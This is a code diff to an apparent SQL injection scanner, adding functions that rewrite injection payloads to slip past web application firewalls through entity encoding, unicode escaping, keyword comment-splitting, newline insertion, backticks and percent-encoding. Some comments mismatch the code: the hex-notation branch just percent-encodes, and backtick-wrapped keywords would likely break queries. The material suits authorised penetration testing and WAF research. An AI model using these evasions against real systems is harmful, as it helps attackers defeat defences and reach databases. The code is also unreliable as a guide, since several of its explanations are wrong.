@@ -30,6 +30,12 @@ from breachsql.engine.http.waf_detect import (
     EVASION_CASE_MIXING,
     EVASION_DOUBLE_ENCODE,
     EVASION_NULL_BYTE,
+    EVASION_HTML_ENCODE,
+    EVASION_UNICODE,
+    EVASION_COMMENT_BREAK,
+    EVASION_NEWLINE,
+    EVASION_BACKTICK,
+    EVASION_CHUNKED_TAGS,
 )
 
 # ---------------------------------------------------------------------------
@@ -732,6 +738,77 @@ def apply_evasion(payload: str, evasion: str) -> str:
 
     if evasion == EVASION_NULL_BYTE:
         return payload + "%00"
+
+    if evasion == EVASION_HTML_ENCODE:
+        # HTML entity-encode SQL special characters
+        _html_map = {
+            "'": "&#39;",
+            '"': "&quot;",
+            "<": "&lt;",
+            ">": "&gt;",
+            "&": "&amp;",
+            "=": "&#61;",
+            "(": "&#40;",
+            ")": "&#41;",
+            ";": "&#59;",
+            "-": "&#45;",
+        }
+        return "".join(_html_map.get(c, c) for c in payload)
+
+    if evasion == EVASION_UNICODE:
+        # Unicode-escape every ASCII letter in SQL keywords to bypass pattern matching.
+        # Only letters are escaped; digits, spaces, and punctuation are left as-is
+        # so the underlying DB still executes the statement.
+        return "".join(
+            f"\\u{ord(c):04x}" if c.isalpha() else c
+            for c in payload
+        )
+
+    if evasion == EVASION_COMMENT_BREAK:
+        # Insert /**/ inside SQL keywords to break WAF keyword matching.
+        import re as _re
+        result = payload
+        for kw in ("UNION", "SELECT", "INSERT", "UPDATE", "DELETE",
+                   "WHERE", "FROM", "AND", "OR", "ORDER", "GROUP",
+                   "HAVING", "LIMIT", "SLEEP", "BENCHMARK", "WAITFOR"):
+            # Break keyword at a sensible split point (after 2nd char at minimum)
+            split = max(2, len(kw) // 2)
+            broken = kw[:split] + "/**/" + kw[split:]
+            # Case-insensitive replace, preserving the first match's case
+            result = _re.sub(
+                _re.escape(kw), broken, result, flags=_re.IGNORECASE
+            )
+        return result
+
+    if evasion == EVASION_NEWLINE:
+        # Inject URL-encoded newline/carriage-return between keywords so WAF
+        # keyword scanning that doesn't normalise whitespace is bypassed.
+        result = payload
+        for kw in ("UNION", "SELECT", "INSERT", "UPDATE", "DELETE",
+                   "WHERE", "FROM", "AND", "OR", "ORDER", "GROUP",
+                   "HAVING", "LIMIT", "SLEEP", "WAITFOR"):
+            result = result.replace(kw, f"%0a{kw}%0d")
+            result = result.replace(kw.lower(), f"%0a{kw.lower()}%0d")
+        return result
+
+    if evasion == EVASION_BACKTICK:
+        # Wrap SQL identifiers (single bare words not already quoted) with backticks.
+        # This works in MySQL/MariaDB to bypass simple keyword detection.
+        import re as _re
+        _kw_re = _re.compile(
+            r"\b(SELECT|FROM|WHERE|AND|OR|UNION|INSERT|UPDATE|DELETE|"
+            r"ORDER|GROUP|HAVING|LIMIT|BY)\b",
+            _re.IGNORECASE,
+        )
+        return _kw_re.sub(lambda m: f"`{m.group(0)}`", payload)
+
+    if evasion == EVASION_CHUNKED_TAGS:
+        # Hex-chunk encoding: encode every character of the payload as a
+        # two-digit hex value and wrap in MySQL's 0x... notation per token.
+        # This is only meaningful when the payload is a string literal that
+        # the WAF is inspecting; other contexts may break.
+        # Fallback: percent-encode each byte (safe universal transform).
+        return "".join(f"%{ord(c):02x}" for c in payload)
 
     return payload
 
